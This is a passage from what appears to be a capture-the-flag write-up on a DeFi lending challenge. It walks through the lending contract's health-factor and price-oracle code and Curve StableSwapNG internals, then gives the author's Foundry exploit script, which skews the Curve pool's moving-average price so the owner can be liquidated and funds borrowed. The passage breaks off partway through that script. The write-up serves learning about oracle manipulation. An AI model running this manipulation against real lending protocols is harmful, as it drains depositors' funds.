</span><span>    </span><span style=color:#0086b3>uint256</span><span> totalBorrowedInEth </span><span style=color:#a71d5d;font-weight:700>=</span><span> 0;
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>for </span><span>(</span><span style=color:#0086b3>uint256</span><span> i </span><span style=color:#a71d5d;font-weight:700>=</span><span> 0; i &lt; assetCount; i++) {
</span><span>        Asset </span><span style=color:#a71d5d;font-weight:700>storage </span><span>asset </span><span style=color:#a71d5d;font-weight:700>=</span><span> assets[i];
</span><span>        UserAccount </span><span style=color:#a71d5d;font-weight:700>storage </span><span>account </span><span style=color:#a71d5d;font-weight:700>=</span><span> userAccounts[_user];
</span><span>
</span><span>        </span><span style=color:#0086b3>uint256</span><span> collateralInEth </span><span style=color:#a71d5d;font-weight:700>=</span><span> account.deposited[i] </span><span style=color:#a71d5d;font-weight:700>* </span><span style=color:#62a35c>getAssetPrice</span><span>(i);
</span><span>        </span><span style=color:#0086b3>uint256</span><span> borrowedInEth </span><span style=color:#a71d5d;font-weight:700>=</span><span> account.borrowed[i] </span><span style=color:#a71d5d;font-weight:700>* </span><span style=color:#62a35c>getAssetPrice</span><span>(i);
</span><span>
</span><span>        totalCollateralInEth </span><span style=color:#a71d5d;font-weight:700>+=</span><span> collateralInEth;
</span><span>        totalBorrowedInEth </span><span style=color:#a71d5d;font-weight:700>+=</span><span> borrowedInEth;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>if </span><span>(totalBorrowedInEth </span><span style=color:#a71d5d;font-weight:700>==</span><span> 0) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return type</span><span>(</span><span style=color:#0086b3>uint256</span><span>).</span><span style=color:#a71d5d;font-weight:700>max</span><span>;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>return</span><span> totalCollateralInEth </span><span style=color:#a71d5d;font-weight:700>*</span><span> PRECISION </span><span style=color:#a71d5d;font-weight:700>/</span><span> totalBorrowedInEth;
</span><span>}
</span></code></pre><p>Health factor is being calculated based on the asset prices, Okay lets see how the asset price is fetched.<pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>getAssetPrice</span><span>(</span><span style=color:#0086b3>uint256 </span><span>_assetId) </span><span style=color:#a71d5d;font-weight:700>public view returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>) {
</span><span>    </span><span style=color:#a71d5d;font-weight:700>if </span><span>(priceOracles[_assetId] </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#0086b3>address</span><span>(0)) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return</span><span> 0;
</span><span>    }
</span><span>    </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#62a35c>IPriceOracle</span><span>(priceOracles[_assetId]).</span><span style=color:#62a35c>getAssetPrice</span><span>(_assetId);
</span><span>}
</span></code></pre><p>Interesting, this is using different price oracles for each asset. <code>SimplePriceOracle</code> is used for asset0, and <code>CurvePoolOracle</code> is used for asset1. <code>SimplePriceOracle</code> always returns the same price meaning we can't manipulate this. But the <code>CurvePoolOracle</code> is fetching the price using <code>price_oracle</code> function of it.<p>We have the asset1(USDC), can we directly interact with <code>CurvePool</code> and do some deposit kind of thing these and change the price.??<p>Yes Bro, that's is what the challenge is and that's called <code>ORACLE MANIPULATION</code> too.<p>Let's see is that <code>CurvePool</code> is vulnerable to Oracle Manipulation or not?<blockquote><p>There was an hint in the statement, "check the differences betweeen the current implementation and the implementation deployed at the pool creation time on mainnet"</blockquote><p>So, the <code>CurvePool</code> deployed at that time might have this kind of vulnerability. Following the traces of the transaction in given in the statement got me a <code>CurveStableSwapNG</code> <strong>Vyper</strong> contract.<blockquote><p>Now the grinding begins, I read all the documentation about this CurveStableSwapNG from here : <a href=https://docs.curve.fi/stableswap-exchange/stableswap-ng/pools/metapool/#remove_liquidity>CurveStableSwapNG Metapool Docs</a>.</blockquote><p>Let me the paste the snippet that is matter to us.<pre class=language-python data-lang=python style=color:#323232;background-color:#fff><code class=language-python data-lang=python><span>@external
</span><span>@view
</span><span>@nonreentrant(</span><span style=color:#183691>'lock'</span><span>)
</span><span style=color:#a71d5d;font-weight:700>def </span><span style=color:#323232;font-weight:700>price_oracle</span><span>(i: uint256) -> uint256:
</span><span>    </span><span style=color:#a71d5d;font-weight:700>return </span><span>self._calc_moving_average(
</span><span>        self.last_prices_packed[i],
</span><span>        self.ma_exp_time,
</span><span>        self.ma_last_time </span><span style=color:#a71d5d;font-weight:700>& </span><span>(</span><span style=color:#0086b3>2</span><span style=color:#a71d5d;font-weight:700>**</span><span style=color:#0086b3>128 </span><span style=color:#a71d5d;font-weight:700>- </span><span style=color:#0086b3>1</span><span>)
</span><span>    )
</span><span>
</span><span>@external
</span><span>@nonreentrant(</span><span style=color:#183691>'lock'</span><span>)
</span><span style=color:#a71d5d;font-weight:700>def </span><span style=color:#323232;font-weight:700>remove_liquidity_imbalance</span><span>(
</span><span>    _amounts: DynArray[uint256, </span><span style=color:#0086b3>MAX_COINS</span><span>],
</span><span>    _max_burn_amount: uint256,
</span><span>    _receiver: address </span><span style=color:#a71d5d;font-weight:700>= </span><span>msg.sender
</span><span>) -> uint256:
</span><span>    </span><span style=color:#969896;font-style:italic>"""
</span><span style=color:#969896;font-style:italic>    @notice Withdraw coins from the pool in an imbalanced amount
</span><span style=color:#969896;font-style:italic>    @param _amounts List of amounts of underlying coins to withdraw
</span><span style=color:#969896;font-style:italic>    @param _max_burn_amount Maximum amount of LP token to burn in the withdrawal
</span><span style=color:#969896;font-style:italic>    @param _receiver Address that receives the withdrawn coins
</span><span style=color:#969896;font-style:italic>    @return Actual amount of the LP token burned in the withdrawal
</span><span style=color:#969896;font-style:italic>    """
</span><span>    amp: uint256 </span><span style=color:#a71d5d;font-weight:700>= </span><span>self._A()
</span><span>    rates: DynArray[uint256, </span><span style=color:#0086b3>MAX_COINS</span><span>] </span><span style=color:#a71d5d;font-weight:700>= </span><span>self._stored_rates()
</span><span>    old_balances: DynArray[uint256, </span><span style=color:#0086b3>MAX_COINS</span><span>] </span><span style=color:#a71d5d;font-weight:700>= </span><span>self._balances()
</span><span>    D0: uint256 </span><span style=color:#a71d5d;font-weight:700>= </span><span>self.get_D_mem(rates, old_balances, amp)
</span><span>    new_balances: DynArray[uint256, </span><span style=color:#0086b3>MAX_COINS</span><span>] </span><span style=color:#a71d5d;font-weight:700>= </span><span>old_balances
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>for </span><span>i </span><span style=color:#a71d5d;font-weight:700>in </span><span style=color:#62a35c>range</span><span>(</span><span style=color:#0086b3>MAX_COINS_128</span><span>):
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>i </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#0086b3>N_COINS_128</span><span>:
</span><span>            </span><span style=color:#a71d5d;font-weight:700>break
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>_amounts[i] </span><span style=color:#a71d5d;font-weight:700>!= </span><span style=color:#0086b3>0</span><span>:
</span><span>            new_balances[i] </span><span style=color:#a71d5d;font-weight:700>-= </span><span>_amounts[i]
</span><span>            self._transfer_out(i, _amounts[i], _receiver)
</span><span>
</span><span>    D1: uint256 </span><span style=color:#a71d5d;font-weight:700>= </span><span>self.get_D_mem(rates, new_balances, amp)
</span><span>    base_fee: uint256 </span><span style=color:#a71d5d;font-weight:700>= </span><span>self.fee </span><span style=color:#a71d5d;font-weight:700>* </span><span style=color:#0086b3>N_COINS </span><span style=color:#a71d5d;font-weight:700>/ </span><span>(</span><span style=color:#0086b3>4 </span><span style=color:#a71d5d;font-weight:700>* </span><span>(</span><span style=color:#0086b3>N_COINS </span><span style=color:#a71d5d;font-weight:700>- </span><span style=color:#0086b3>1</span><span>))
</span><span>    ys: uint256 </span><span style=color:#a71d5d;font-weight:700>= </span><span>(D0 </span><span style=color:#a71d5d;font-weight:700>+ </span><span>D1) </span><span style=color:#a71d5d;font-weight:700>/ </span><span style=color:#0086b3>N_COINS
</span><span>
</span><span>    fees: DynArray[uint256, </span><span style=color:#0086b3>MAX_COINS</span><span>] </span><span style=color:#a71d5d;font-weight:700>= </span><span>empty(DynArray[uint256, </span><span style=color:#0086b3>MAX_COINS</span><span>])
</span><span>    dynamic_fee: uint256 </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>0
</span><span>    xs: uint256 </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>0
</span><span>    ideal_balance: uint256 </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>0
</span><span>    difference: uint256 </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>0
</span><span>    new_balance: uint256 </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>0
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>for </span><span>i </span><span style=color:#a71d5d;font-weight:700>in </span><span style=color:#62a35c>range</span><span>(</span><span style=color:#0086b3>MAX_COINS_128</span><span>):
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>i </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#0086b3>N_COINS_128</span><span>:
</span><span>            </span><span style=color:#a71d5d;font-weight:700>break
</span><span>
</span><span>        ideal_balance </span><span style=color:#a71d5d;font-weight:700>= </span><span>D1 </span><span style=color:#a71d5d;font-weight:700>* </span><span>old_balances[i] </span><span style=color:#a71d5d;font-weight:700>/ </span><span>D0
</span><span>        difference </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>0
</span><span>        new_balance </span><span style=color:#a71d5d;font-weight:700>= </span><span>new_balances[i]
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>ideal_balance </span><span style=color:#a71d5d;font-weight:700>> </span><span>new_balance:
</span><span>            difference </span><span style=color:#a71d5d;font-weight:700>= </span><span>ideal_balance </span><span style=color:#a71d5d;font-weight:700>- </span><span>new_balance
</span><span>        </span><span style=color:#a71d5d;font-weight:700>else</span><span>:
</span><span>            difference </span><span style=color:#a71d5d;font-weight:700>= </span><span>new_balance </span><span style=color:#a71d5d;font-weight:700>- </span><span>ideal_balance
</span><span>
</span><span>        xs </span><span style=color:#a71d5d;font-weight:700>= </span><span>unsafe_div(rates[i] </span><span style=color:#a71d5d;font-weight:700>* </span><span>(old_balances[i] </span><span style=color:#a71d5d;font-weight:700>+ </span><span>new_balance), </span><span style=color:#0086b3>PRECISION</span><span>)
</span><span>        dynamic_fee </span><span style=color:#a71d5d;font-weight:700>= </span><span>self._dynamic_fee(xs, ys, base_fee)
</span><span>        fees.append(dynamic_fee </span><span style=color:#a71d5d;font-weight:700>* </span><span>difference </span><span style=color:#a71d5d;font-weight:700>/ </span><span style=color:#0086b3>FEE_DENOMINATOR</span><span>)
</span><span>
</span><span>        self.admin_balances[i] </span><span style=color:#a71d5d;font-weight:700>+= </span><span>fees[i] </span><span style=color:#a71d5d;font-weight:700>* </span><span>admin_fee </span><span style=color:#a71d5d;font-weight:700>/ </span><span style=color:#0086b3>FEE_DENOMINATOR
</span><span>        new_balances[i] </span><span style=color:#a71d5d;font-weight:700>-= </span><span>fees[i]
</span><span>
</span><span>    D1 </span><span style=color:#a71d5d;font-weight:700>= </span><span>self.get_D_mem(rates, new_balances, amp)  </span><span style=color:#969896;font-style:italic># dev: reuse D1 for new D.
</span><span>
</span><span>    self.upkeep_oracles(new_balances, amp, D1)
</span><span>
</span><span>    total_supply: uint256 </span><span style=color:#a71d5d;font-weight:700>= </span><span>self.total_supply
</span><span>    burn_amount: uint256 </span><span style=color:#a71d5d;font-weight:700>= </span><span>((D0 </span><span style=color:#a71d5d;font-weight:700>- </span><span>D1) </span><span style=color:#a71d5d;font-weight:700>* </span><span>total_supply </span><span style=color:#a71d5d;font-weight:700>/ </span><span>D0) </span><span style=color:#a71d5d;font-weight:700>+ </span><span style=color:#0086b3>1
</span><span>    </span><span style=color:#a71d5d;font-weight:700>assert </span><span>burn_amount </span><span style=color:#a71d5d;font-weight:700>> </span><span style=color:#0086b3>1  </span><span style=color:#969896;font-style:italic># dev: zero tokens burned
</span><span>    </span><span style=color:#a71d5d;font-weight:700>assert </span><span>burn_amount </span><span style=color:#a71d5d;font-weight:700>&lt;= </span><span>_max_burn_amount, </span><span style=color:#183691>"Slippage screwed you"
</span><span>
</span><span>    total_supply </span><span style=color:#a71d5d;font-weight:700>-= </span><span>burn_amount
</span><span>    self._burnFrom(msg.sender, burn_amount)
</span><span>
</span><span>    log RemoveLiquidityImbalance(msg.sender, _amounts, fees, D1, total_supply)
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>return </span><span>burn_amount
</span></code></pre><p>I found out that <code>price_oracle()</code> is volatile and dependent on <code>ma_last_time</code>, <code>ma_last_time</code>. And the <code>remove_liquidity_imbalance()</code> will make the pool imbalance.<p>Thats very interesting, let me summarize what I wanted to do here. - Increase price of asset 1 by adding liquidity and removing liquidity in different blocks - and liquidate owner and get his 10000 balance of asset0 and - Borrow remaining asset 0 balance to achieve 20000 asset 0 by depositing asset 1<p>Thats seems simple but you need to go through a lot of grinding there.<p>Can't explain more, just read my messy exploit script.<div class=note-container><button class=note-toggle><div class=note-icon><p>Oracle.s.sol</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span style=color:#a71d5d;font-weight:700>pragma solidity ^</span><span style=color:#0086b3>0.8.0</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/Script.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/console.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"../src/Oracle.sol"</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>OracleSolve </span><span style=color:#a71d5d;font-weight:700>is </span><span style=color:#62a35c>Script </span><span>{
</span><span>    Oracle </span><span style=color:#a71d5d;font-weight:700>public </span><span>oracle </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>Oracle</span><span>(</span><span style=color:#0086b3>0x0F113F8Cd37DdB04c09BBf45D6fafEAa6C7b09E6</span><span>);
</span><span>    </span><span style=color:#0086b3>address</span><span> player </span><span style=color:#a71d5d;font-weight:700>=</span><span> vm.</span><span style=color:#62a35c>envAddress</span><span>(</span><span style=color:#183691>"PLAYER"</span><span>);
</span><span>    SimplePriceOracle </span><span style=color:#a71d5d;font-weight:700>public </span><span>simplePriceOracle;
</span><span>    CurvePriceOracle </span><span style=color:#a71d5d;font-weight:700>public </span><span>curvePriceOracle;
</span><span>    ICurve </span><span style=color:#a71d5d;font-weight:700>public </span><span>curvePool;
</span><span>
</span><span style=color:#969896;font-style:italic>/*
</span><span style=color:#969896;font-style:italic>@external
</span><span style=color:#969896;font-style:italic>@view
</span><span style=color:#969896;font-style:italic>@nonreentrant('lock')
</span><span style=color:#969896;font-style:italic>def price_oracle(i: uint256) -> uint256:
</span><span style=color:#969896;font-style:italic>    return self._calc_moving_average(
</span><span style=color:#969896;font-style:italic>        self.last_prices_packed[i],
</span><span style=color:#969896;font-style:italic>        self.ma_exp_time,
</span><span style=color:#969896;font-style:italic>        self.ma_last_time & (2**128 - 1)
</span><span style=color:#969896;font-style:italic>    )
</span><span style=color:#969896;font-style:italic>*/
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>run</span><span>() </span><span style=color:#a71d5d;font-weight:700>external</span><span>{
</span><span>        vm.</span><span style=color:#62a35c>startBroadcast</span><span>(vm.</span><span style=color:#62a35c>envUint</span><span>(</span><span style=color:#183691>"PRIVATE_KEY"</span><span>));
</span><span>        simplePriceOracle </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>SimplePriceOracle</span><span>(oracle.</span><span style=color:#62a35c>priceOracles</span><span>(0));
</span><span>        curvePriceOracle </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>CurvePriceOracle</span><span>(oracle.</span><span style=color:#62a35c>priceOracles</span><span>(1)); </span><span style=color:#969896;font-style:italic>// curvePool Oracle is for asset 1 
</span><span>        curvePool </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>ICurve</span><span>(curvePriceOracle.</span><span style=color:#62a35c>curvePool</span><span>());
</span><span>
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player : "</span><span>, oracle.</span><span style=color:#62a35c>player</span><span>());
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"assetCount : "</span><span>, oracle.</span><span style=color:#62a35c>assetCount</span><span>());
</span><span>
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"-------------------------------------"</span><span>);
</span><span>        (</span><span style=color:#0086b3>IERC20</span><span> assetToken0, </span><span style=color:#0086b3>uint256</span><span> totalDeposited0, </span><span style=color:#0086b3>uint256</span><span> totalBorrowed0, </span><span style=color:#0086b3>uint256</span><span> baseRate0 ) </span><span style=color:#a71d5d;font-weight:700>=</span><span> oracle.</span><span style=color:#62a35c>assets</span><span>(0);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"asset0 address: "</span><span>, </span><span style=color:#0086b3>address</span><span>(assetToken0));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"asset0 totalDeposited0 : "</span><span>, totalDeposited0);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"asset0 totalBorrowed0 : "</span><span>, totalBorrowed0);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"asset0 baseRate0 : "</span><span>, baseRate0);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"asset0 priceOracle : "</span><span>, oracle.</span><span style=color:#62a35c>priceOracles</span><span>(0));
</span><span>
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"-------------------------------------"</span><span>);
</span><span>        (</span><span style=color:#0086b3>IERC20</span><span> assetToken1, </span><span style=color:#0086b3>uint256</span><span> totalDeposited1, </span><span style=color:#0086b3>uint256</span><span> totalBorrowed1, </span><span style=color:#0086b3>uint256</span><span> baseRate1 ) </span><span style=color:#a71d5d;font-weight:700>=</span><span> oracle.</span><span style=color:#62a35c>assets</span><span>(1);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"asset1 address: "</span><span>, </span><span style=color:#0086b3>address</span><span>(assetToken1));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"asset1 totalDeposited1 : "</span><span>, totalDeposited1);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"asset1 totalBorrowed1 : "</span><span>, totalBorrowed1);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"asset1 baseRate1 : "</span><span>, baseRate1);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"asset1 priceOracle : "</span><span>, oracle.</span><span style=color:#62a35c>priceOracles</span><span>(1));
</span><span>        
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"---------------Owner-----------------"</span><span>);
</span><span>        (</span><span style=color:#0086b3>uint256</span><span> O_deposited0, </span><span style=color:#0086b3>uint256</span><span> O_borrowed0, </span><span style=color:#0086b3>uint256</span><span> O_lastInterestedBlock0) </span><span style=color:#a71d5d;font-weight:700>=</span><span> oracle.</span><span style=color:#62a35c>getUserAccount</span><span>(oracle.</span><span style=color:#62a35c>owner</span><span>(), 0, 0 , 0);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"deposited0 : "</span><span>, O_deposited0);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"borrowed0 : "</span><span>, O_borrowed0);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"lastInterestedBlock0 : "</span><span>, O_lastInterestedBlock0);
</span><span>
</span><span>        (</span><span style=color:#0086b3>uint256</span><span> O_deposited1, </span><span style=color:#0086b3>uint256</span><span> O_borrowed1, </span><span style=color:#0086b3>uint256</span><span> O_lastInterestedBlock1) </span><span style=color:#a71d5d;font-weight:700>=</span><span> oracle.</span><span style=color:#62a35c>getUserAccount</span><span>(oracle.</span><span style=color:#62a35c>owner</span><span>(), 1, 1 , 1);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"deposited1 : "</span><span>, O_deposited1);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"borrowed1 : "</span><span>, O_borrowed1);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"lastInterestedBlock1 : "</span><span>, O_lastInterestedBlock1);
</span><span>
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"asset0 balance : "</span><span>, assetToken0.</span><span style=color:#62a35c>balanceOf</span><span>(oracle.</span><span style=color:#62a35c>owner</span><span>()));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"asset1 balance : "</span><span>, assetToken1.</span><span style=color:#62a35c>balanceOf</span><span>(oracle.</span><span style=color:#62a35c>owner</span><span>()));
</span><span>
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"oracle asset0 balance : "</span><span>, assetToken0.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(oracle)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"oracle asset1 balance : "</span><span>, assetToken1.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(oracle)));
</span><span>        
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"---------------Player-----------------"</span><span>);
</span><span>        (</span><span style=color:#0086b3>uint256</span><span> P_deposited0, </span><span style=color:#0086b3>uint256</span><span> P_borrowed0, </span><span style=color:#0086b3>uint256</span><span> P_lastInterestedBlock0) </span><span style=color:#a71d5d;font-weight:700>=</span><span> oracle.</span><span style=color:#62a35c>getUserAccount</span><span>(player, 0, 0 , 0);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"deposited0 : "</span><span>, P_deposited0);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"borrowed0 : "</span><span>, P_borrowed0);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"lastInterestedBlock0 : "</span><span>, P_lastInterestedBlock0);
</span><span>
</span><span>        (</span><span style=color:#0086b3>uint256</span><span> P_deposited1, </span><span style=color:#0086b3>uint256</span><span> P_borrowed1, </span><span style=color:#0086b3>uint256</span><span> P_lastInterestedBlock1) </span><span style=color:#a71d5d;font-weight:700>=</span><span> oracle.</span><span style=color:#62a35c>getUserAccount</span><span>(player, 1, 1 , 1);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"deposited1 : "</span><span>, P_deposited1);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"borrowed1 : "</span><span>, P_borrowed1);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"lastInterestedBlock1 : "</span><span>, P_lastInterestedBlock1);
</span><span>
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"asset0 balance : "</span><span>, assetToken0.</span><span style=color:#62a35c>balanceOf</span><span>(player));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"asset1 balance : "</span><span>, assetToken1.</span><span style=color:#62a35c>balanceOf</span><span>(player));
</span><span>        
</span><span>        
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"-------------Price Oracles---------------"</span><span>);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"simplePriceOracle: "</span><span>, </span><span style=color:#0086b3>address</span><span>(simplePriceOracle));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"simplePriceOracle asset0 Price : "</span><span>, simplePriceOracle.</span><span style=color:#62a35c>getAssetPrice</span><span>(0));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"simplePriceOracle asset1 Price : "</span><span>, simplePriceOracle.</span><span style=color:#62a35c>getAssetPrice</span><span>(1));
</span><span>
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"curvePriceOracle (asset 1): "</span><span>, </span><span style=color:#0086b3>address</span><span>(curvePriceOracle));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"curvePriceOracle Curve Pool : "</span><span>, </span><span style=color:#0086b3>address</span><span>(curvePool));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Curve asset0 Price : "</span><span>, curvePriceOracle.</span><span style=color:#62a35c>getAssetPrice</span><span>(0));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Curve asset1 Price : "</span><span>, curvePriceOracle.</span><span style=color:#62a35c>getAssetPrice</span><span>(1)); </span><span style=color:#969896;font-style:italic>// TARGET = 1200000000000000000
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Curve SpotPrice : "</span><span>, curvePriceOracle.</span><span style=color:#62a35c>getSpotPrice</span><span>());
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"-------------------------------------"</span><span>);
</span><span>
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"token 0 in curve pool : "</span><span>, curvePool.</span><span style=color:#62a35c>coins</span><span>(0));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"token 1 in curve pool : "</span><span>, curvePool.</span><span style=color:#62a35c>coins</span><span>(1));
</span><span>
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// Goal is to reduce the price of asset 1 in the pool
</span><span>        </span><span style=color:#0086b3>uint256</span><span> amountOfAsset0 </span><span style=color:#a71d5d;font-weight:700>=</span><span> assetToken0.</span><span style=color:#62a35c>balanceOf</span><span>(player);
</span><span>        </span><span style=color:#0086b3>uint256</span><span> amountOfAsset1 </span><span style=color:#a71d5d;font-weight:700>=</span><span> assetToken1.</span><span style=color:#62a35c>balanceOf</span><span>(player);
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// RUN - 1, RUN - 2
</span><span>        </span><span style=color:#0086b3>uint256</span><span>[] </span><span style=color:#a71d5d;font-weight:700>memory</span><span> amountsToAdd </span><span style=color:#a71d5d;font-weight:700>= new </span><span style=color:#0086b3>uint256</span><span>[](2);
</span><span>        amountsToAdd[0] </span><span style=color:#a71d5d;font-weight:700>=</span><span> amountOfAsset0</span><span style=color:#a71d5d;font-weight:700>/</span><span>2;
</span><span>        amountsToAdd[1] </span><span style=color:#a71d5d;font-weight:700>=</span><span> 0;
</span><span>        assetToken0.</span><span style=color:#62a35c>approve</span><span>(</span><span style=color:#0086b3>address</span><span>(curvePool), amountOfAsset0);
</span><span>        curvePool.</span><span style=color:#62a35c>add_liquidity</span><span>(amountsToAdd, 0);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"LP balance of Player : "</span><span>, curvePool.</span><span style=color:#62a35c>balanceOf</span><span>(player));
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// RUN - 3
</span><span>        </span><span style=color:#0086b3>uint256</span><span>[] </span><span style=color:#a71d5d;font-weight:700>memory</span><span> amountsToRemove </span><span style=color:#a71d5d;font-weight:700>= new </span><span style=color:#0086b3>uint256</span><span>[](2);
</span><span>        amountsToRemove[0] </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>9999 ether</span><span>;
</span><span>        amountsToRemove[1] </span><span style=color:#a71d5d;font-weight:700>=</span><span> 0;
</span><span>        curvePool.</span><span style=color:#62a35c>approve</span><span>(</span><span style=color:#0086b3>address</span><span>(curvePool), curvePool.</span><span style=color:#62a35c>balanceOf</span><span>(player));
</span><span>        curvePool.</span><span style=color:#62a35c>remove_liquidity_imbalance</span><span>(amountsToRemove, curvePool.</span><span style=color:#62a35c>balanceOf</span><span>(player));
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>//  RUN - 4
</span><span>        assetToken1.</span><span style=color:#62a35c>approve</span><span>(</span><span style=color:#0086b3>address</span><span>(oracle), amountOfAsset1);
</span><span>        oracle.</span><span style=color:#62a35c>liquidate</span><span>(oracle.</span><span style=color:#62a35c>owner</span><span>(), 1, amountOfAsset1, 0);
</span><span>        
</span><span>        </span><span style=color:#969896;font-style:italic>//  RUN - 5
</span><span>        assetToken1.</span><span style=color:#62a35c>approve</span><span>(</span><span style=color:#0086b3>address</span><span>(oracle), amountOfAsset1);
</span><span>        oracle.</span><span style=color:#62a35c>deposit</span><span>(1, amountOfAsset1);
</span><span>        oracle.</span><span style=color:#62a35c>borrow</span><span>(0, 1 ether);
</span><span>
